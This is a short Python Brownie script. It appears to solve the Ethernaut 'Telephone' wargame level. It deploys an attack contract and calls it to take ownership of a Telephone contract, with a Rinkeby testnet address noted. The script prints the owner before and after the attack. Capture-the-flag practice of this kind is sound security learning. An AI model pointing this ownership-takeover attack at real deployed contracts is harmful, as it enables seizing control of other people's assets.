#!/usr/bin/python3
from brownie import interface, AttackTelephone
from scripts.deploy import deploy
from scripts.helpful_scripts import get_account
from colorama import Fore

# * colours
green = Fore.GREEN
red = Fore.RED
blue = Fore.BLUE
magenta = Fore.MAGENTA
reset = Fore.RESET

# * Rinkeby address : 0x530BbCb6399F540Cb92C4eAD271596754Df6B276


def telephone(contract_address=None, attacker=None):
    if not contract_address:
        telephone_contract, _ = deploy()
        contract_address = telephone_contract.address
        _, attacker = get_account()
    else:
        telephone_contract = interface.Telephone(contract_address)

    telephone_attack = AttackTelephone.deploy(telephone_contract, {"from": attacker})

    print(f"{green}Owner address: {magenta}{telephone_contract.owner()}{reset}")
    print(f"{red}Attacking Now...{reset}")

    attacking_tx = telephone_attack.attack({"from": attacker, "allow_revert": True})
    attacking_tx.wait(1)

    print(f"{green}Attacker address: {red}{attacker}")
    print(f"{green}New Owner: {red}{telephone_contract.owner()}{reset}")


def main(contract_address=None):
    if contract_address:
        telephone(contract_address, get_account())
    else:
        telephone()


if __name__ == "__main__":
    main()
